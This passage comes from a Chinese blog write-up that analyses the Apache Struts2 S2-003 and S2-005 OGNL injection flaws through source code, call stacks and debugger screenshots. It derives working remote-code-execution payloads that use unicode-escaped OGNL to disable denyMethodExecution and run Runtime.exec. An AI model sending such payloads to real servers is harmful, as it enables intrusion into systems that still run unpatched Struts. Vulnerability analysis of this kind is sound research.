&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102032765.png" alt="image-20250408102032765"></p><p>来到 stack.setValue(name, value) 我们步入，发现他会调用 OgnlUtil#setValue 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102135883.png" alt="image-20250408102135883"></p><p>继续跟入，发现他会去封装一个 Node 节点，这就有意思了</p><blockquote><p>我们之前也讲到过，ognl 有很多的 node 节点，也就是 AST 的一些实现</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102747975.png" alt="image-20250408102747975" style="zoom: 50%;" /><p>每种都有不同的功能</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102610006.png" alt="image-20250408102610006"></p><p>正常情况下，会封装一个 ASTProperty 的节点</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102858631.png" alt="image-20250408102858631"></p><p>执行他的 setValueBody 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408103021214.png" alt="image-20250408103021214"></p><p>我们知道了这些，就可以看看 有没有一个 抽象语法书的 setValueBody 方法 是可以直接解析 ognl 表达式的</p><h3 id="ASTEval-分析"><a href="#ASTEval-分析" class="headerlink" title="ASTEval 分析"></a>ASTEval 分析</h3><p><strong>最终找到了 ASTEval 这个节点的 setValueBody 方法</strong></p><p>我们来看一下他是如何解析的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValueBody</span><span class="hljs-params">(OgnlContext context, Object target, Object value)</span> <span class="hljs-keyword">throws</span> OgnlException &#123;<br>    <span class="hljs-comment">// 取第一个 children 的值并计算，给到 expr</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>. children[<span class="hljs-number">0</span>].getValue(context, target);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">previousRoot</span> <span class="hljs-operator">=</span> context.getRoot();<br>    <span class="hljs-comment">// 取第二个 children 的值并计算，给到 target</span><br>    target = <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>].getValue(context, target);<br>    <span class="hljs-comment">// 判断 expr 是否为 node 类型，如果不是，则调用 Ognl.parseExpression() 尝试进行解析，解析的结果强转为 node 类型；</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> expr <span class="hljs-keyword">instanceof</span> Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        context.setRoot(target);<br>        <span class="hljs-comment">// 最后调用 setValue </span><br>        node.setValue(context, target, value);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        context.setRoot(previousRoot);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>通过上述代码逻辑，我们不难发现我们的参数形式应该是 <code>(one)(two)</code> 这种，且 children [0] 也就是 <code>(one)</code> 如果是 ognl 表达式的话，就会被 Ognl.parseExpression 解析</p><p>我们尝试传入 payload 参数 <code>(one)(two)</code> , 看到抽象成了，ASTEval 这种节点</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408130408561.png" alt="image-20250408130408561"></p><p>看到进入了 ASTEval 的 setValueBody 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408130520271.png" alt="image-20250408130520271"></p><p>那我们尝试传入 ognl 表达式，看看能不能正常解析呢?</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-symbol">&#x27;@java.lang.Runtime@getRuntime</span>().exec(\<span class="hljs-symbol">&#x27;calc</span>\&#x27;)&#x27;)(<span class="hljs-symbol">&#x27;aaa</span>&#x27;)<br></code></pre></td></tr></table></figure><p>并没有执行，我们调试一下看看</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408164738608.png" alt="image-20250408164738608"></p><p>调用栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">98</span>, XWorkMethodAccessor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">847</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">65</span>, ASTStaticMethod (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">168</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">75</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">476</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">186</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">158</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">146</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">187</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">intercept:</span><span class="hljs-number">153</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure><p>这主要是因为 在 ParametersInterceptor#intercept 函数中，设置了 DenyMethodExecution 为 true</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408144609472.png" alt="image-20250408144609472"></p><h3 id="unicode-符号绕过"><a href="#unicode-符号绕过" class="headerlink" title="unicode 符号绕过"></a>unicode 符号绕过</h3><p>我们得用 ognl 表达式，把 <code>xwork.MethodAccessor.denyMethodExecution</code> 这个的值改为 false</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">(#context[<span class="hljs-string">&#x27;xwork2.ognl.OgnlRuntime.denyMethodExecution&#x27;</span>]=false)(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>url编码后<br>(%23context%5b%27xwork2.ognl.OgnlRuntime.denyMethodExecution%27%5d%3dfalse)(%27aaa%27)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408144856456.png" alt="image-20250408144856456"></p><p>看一下这个实现</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">protected <span class="hljs-type">boolean</span> acceptableName(String <span class="hljs-type">name</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">61</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">44</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">35</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">58</span>) == <span class="hljs-number">-1</span> &amp;&amp; !this.isExcluded(<span class="hljs-type">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的 ascii 码分别为  <code>=</code>、<code>,</code>、<code>#</code> 、<code>:</code></p><p>这部分的绕过</p><blockquote><p>由于在 <code>OgnlParserTokenManager</code> 方法中使用了 <code>ognl.JavaCharStream#readChar()</code> 方法，在读到 <code>\\u</code> 的情况下，会继续读入 4 个字符，并将它们转换为 char，因此 OGNL 表达式实际上支持了 unicode 编码，这就绕过了之前正则或者字符串判断的限制。</p></blockquote><p>我们传入 unicode 编码的 payload</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(&#x27;\u0023context[\<span class="hljs-symbol">&#x27;xwork.MethodAccessor.denyMethodExecution</span>\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)<br></code></pre></td></tr></table></figure><p>当我们传入了表达式时，会去执行 complie</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165140827.png" alt="image-20250408165140827"></p><p>可以去看一下他的处理</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165321300.png" alt="image-20250408165321300"></p><p>调用 topLevelExpression</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165356848.png" alt="image-20250408165356848"></p><p>内部有处理 unicode 编码的逻辑，其主要逻辑在 JavaCharStream 中，在 OgnlParser 的构造函数中，就初始化了 JavaCharStream</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170429804.png" alt="image-20250408170429804"></p><p>我们在 javaCharStream 的 readChar 函数下断点</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170523773.png" alt="image-20250408170523773"></p><p>在 294 行看到处理 unicode 编码的逻辑</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170902764.png" alt="image-20250408170902764"></p><p>经过 complie 解析后 return o 的值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408174638058.png" alt="image-20250408174638058"></p><p>之后到 ASTEval 的 setValueBody</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408175307016.png" alt="image-20250408175307016"></p><h3 id="双层-ASTEval-绕过"><a href="#双层-ASTEval-绕过" class="headerlink" title="双层 ASTEval 绕过"></a>双层 ASTEval 绕过</h3><blockquote><p><code>ASTAssign</code> (代表赋值操作，如 <code>user.name = &#39;New Value&#39;</code>)</p></blockquote><p>但是我们就两个 <code>(one)(two)</code> 的时候，会抛出异常</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408175608060.png" alt="image-20250408175608060"></p><p>这是因为 我们 在 ASTEval 的 setValueBody 中，children [0] 和 children [1] 获取完了之后，调用了 ASTAssign 的 setValue 方法，而 ASTAssign 本身就没有 setValue 方法，他只实现了 getValueBody 方法，也就是说 ASTAssign 这个节点是不允许有 setValue 操作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ognl;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ASTAssign</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleNode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ASTAssign</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">super</span>(id);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ASTAssign</span><span class="hljs-params">(OgnlParser p, <span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">super</span>(p, id);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">getValueBody</span><span class="hljs-params">(OgnlContext context, Object source)</span> <span class="hljs-keyword">throws</span> OgnlException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>].getValue(context, source);<br>        <span class="hljs-built_in">super</span>.children[<span class="hljs-number">0</span>].setValue(context, source, result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.children[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; = &quot;</span> + <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这本身也是见名知意的事情，ASTAssign 的语义是“执行赋值”，而不是“被赋值”。</p><p>通过 getValueBody 执行赋值：</p><ol><li><p>求值右边（children [1]），得到一个值。</p></li><li><p>将这个值设置到左边（children [0]）上。</p></li><li><p>返回右边的值作为整个表达式的结果。</p></li></ol></blockquote><p>那我们要怎么去让他执行到 getValueBody 呢？</p><p>答案也很简单，我们让 ASTEval 的 children [0] 作为一个新的 ASTEval，这时候 children [0].getValueBody() 方法就会去执行 ASTEval 的 getValueBody 方法，进而可以执行到 ASTAssign 的 getValueBody 方法</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(&#x27;\u0023context[\<span class="hljs-symbol">&#x27;xwork.MethodAccessor.denyMethodExecution</span>\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)(<span class="hljs-name">aaa</span>)<br></code></pre></td></tr></table></figure><p>看到 在 ASTEval 的 setValueBody 中 children [0] 作为了一个新的 ASTEval 对象，并且可以执行 getValue 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408184404932.png" alt="image-20250408184404932"></p><p>跟一下</p><p>ognl.SimpleNode#getValue &#x3D;&gt; ognl.SimpleNode#evaluateGetValueBody &#x3D;&gt; ASTEval#getValueBody</p><p>可以看到最终到了 ASTAssign 的 getValue 方法 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408184932123.png" alt="image-20250408184932123"></p><p>ASTAssign 也没有实现 getValue 方法，经过父类的中转，最终来到了它的 getValueBody 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408182016464.png" alt="image-20250408182016464"></p><p>再往下走一步</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408182045669.png" alt="image-20250408182045669"></p><h3 id="最终-payload"><a href="#最终-payload" class="headerlink" title="最终 payload"></a>最终 payload</h3><p>经过上面的分析，我们的 payload 来到了</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)(<span class="hljs-name">aaa</span>)&amp;(&#x27;@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(&#x27;aaa&#x27;)<br></code></pre></td></tr></table></figure><p>我们打进去看看</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190227623.png" alt="image-20250408190227623"></p><p>由于 TreeMap 的特性，我们会先去解析静态变量 <code>@</code> 我们得在 Runtime 之前给他加个赋值语句, 加上 <code>=</code> 号 之后，别忘了再次 把 ASTEval 双写，不然还是会 在 ASTAssign 出报错的</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure><p>看到先执行 </p><blockquote><p>(‘\u0023context [&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse’)(lingx5)(lingx5)</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190714955.png" alt="image-20250408190714955"></p><p>在执行</p><blockquote><p>(‘\u0023lingx5\<a href="mailto:&#x75;&#48;&#48;&#x33;&#x64;&#x40;&#x6a;&#x61;&#118;&#x61;&#x2e;&#108;&#x61;&#x6e;&#x67;&#x2e;&#x52;&#x75;&#110;&#x74;&#105;&#x6d;&#x65;">u003d@java.lang.Runtime</a>@getRuntime().exec(&#39;calc&#39;)’)(lingx5)(lingx5)</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408191245437.png" alt="image-20250408191245437"></p><p>来到了命令执行拦截的地方，可以看到 这次我们的 e 为 false ，就会去调用方法了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190948927.png" alt="image-20250408190948927"></p><p>去掉断点，运行程序，成功执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408191548600.png" alt="image-20250408191548600"></p><h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><p>官方在 struts2-core 2.0.12 对 S2-003 进行了修复，S2-005 实际上就是 S2-003 的绕过</p><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-005">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p><p>看到 setParameters 方法 新增了一个 ClearableValueStack 和 MemberAccessValueStack 接口，来增加安全性</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408205604183.png" alt="image-20250408205604183"></p><p>这两个安全接口由 com.opensymphony.xwork2.util.OgnlValueStack 实现</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409093830901.png" alt="image-20250409093830901"></p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以用 S3-003 的 payload 来打一下，看看有哪些限制</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure><p>看到在 ParametersInterceptor#setParameters 方法 初始化的 stack，新添了一些安全的参数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409094931824.png" alt="image-20250409094931824"></p><p>看到第一个参数执行完成，还是可以成功修改 xwork.MethodAccessor.denyMethodExecution 的值的</p><blockquote><p>(‘\u0023context [&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse’)(lingx5)(lingx5)</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409095334113.png" alt="image-20250409095334113"></p><p>这就说明了，我们的 ognl 表达式 还是可以被解析执行的。那么我们的方法并没有执行，肯定是新加入的某个参数判断，阻止了 我们的恶意命令执行，我们只需要把它找出来，用 ognl 表达式修改为对应可以执行的参数即可</p><p>我们跟一下这个第二句命令执行的操作，看看是哪里做了限制</p><blockquote><p>(‘\u0023lingx5\<a href="mailto:&#x75;&#48;&#48;&#51;&#x64;&#x40;&#106;&#x61;&#x76;&#97;&#x2e;&#108;&#97;&#110;&#103;&#x2e;&#x52;&#117;&#x6e;&#x74;&#105;&#109;&#101;">u003d@java.lang.Runtime</a>@getRuntime().exec(&#39;calc&#39;)’)(lingx5)(lingx5)</p></blockquote><p>通过调试发现在 SecurityMemberAccess#isAcceptableProperty 的判断，没有通过</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409102424409.png" alt="image-20250409102424409"></p><p>程序的调用站，拿出来看一下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">isAcceptableProperty:</span><span class="hljs-number">71</span>, SecurityMemberAccess (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">isAccessible:</span><span class="hljs-number">67</span>, SecurityMemberAccess (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">isMethodAccessible:</span><span class="hljs-number">1283</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">callAppropriateMethod:</span><span class="hljs-number">796</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">48</span>, ObjectMethodAccessor (ognl)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">99</span>, XWorkMethodAccessor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">833</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">65</span>, ASTStaticMethod (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">109</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">49</span>, ASTAssign (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">58</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">67</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">476</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">186</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">178</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">166</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">230</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">doIntercept:</span><span class="hljs-number">176</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure><p>我们来看一下 isAcceptableProperty 这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAcceptableProperty</span><span class="hljs-params">(String name)</span> &#123;<br>    <span class="hljs-keyword">if</span> (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">//  isAccepted 方法的判断逻辑</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccepted</span><span class="hljs-params">(String paramName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.acceptProperties.isEmpty()) &#123;<br>        <span class="hljs-keyword">for</span> (Pattern pattern : acceptProperties) &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(paramName);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//no match, but acceptedParams is not empty</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//empty acceptedParams</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// isExcluded 方法的判断逻辑</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isExcluded</span><span class="hljs-params">(String paramName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.excludeProperties.isEmpty()) &#123;<br>        <span class="hljs-keyword">for</span> (Pattern pattern : excludeProperties) &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(paramName);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上逻辑不难发现只有当 <code>isAccepted()</code> 返回 true，<code>isExcluded()</code> 返回 false 的情况下，才能调用方法</p><p>我们接着往下调试，看到 <code>isAccepted()</code> 返回 true</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409103041065.png" alt="image-20250409103041065"></p><p>而在 isExcluded() 方法中，因为 paramName 为空 抛出了异常，所以就没有放回 false</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409103130411.png" alt="image-20250409103130411"></p><p>所以我们只需要用 ognl 表达式把 excludeProperties  设置为空，就可以绕过这个异常抛出，从而返回 false</p><p>我们看看 excludeProperties 在哪里？怎么设置</p><p>在刚开始创建的 newStack 中</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409104635205.png" alt="image-20250409104635205" style="zoom:67%;" /><p>我们跟一下 newStack 的创建过程 发现调用了 ognl.Ognl#createDefaultContext 方法 来创建 context 上下文</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409105234009.png" alt="image-20250409105234009"></p><p>封转完成 是 给到了 OgnlContext 的 memberAccess 属性，看到它继承了 Map</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409123017789.png" alt="image-20250409123017789"></p><p>那么我们的程序是如何来获取的呢？</p><p>最终在 OgnlContext 的 get 